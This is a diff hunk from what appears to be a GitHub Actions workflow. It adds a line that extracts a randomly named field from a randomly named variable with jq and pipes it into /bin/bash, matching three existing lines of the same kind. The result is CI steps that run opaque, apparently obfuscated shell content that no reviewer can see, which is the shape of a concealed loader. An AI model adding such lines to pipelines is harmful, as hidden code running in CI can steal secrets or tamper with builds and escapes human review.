@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$tz062" | jq -r .bnv0 | /bin/bash
           echo $wh5 | jq -r .uuvyv47152 | /bin/bash
           echo $f944 | jq -r .tol65 | /bin/bash
+          printf '%s' "$o25" | jq -r .wyyon4 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
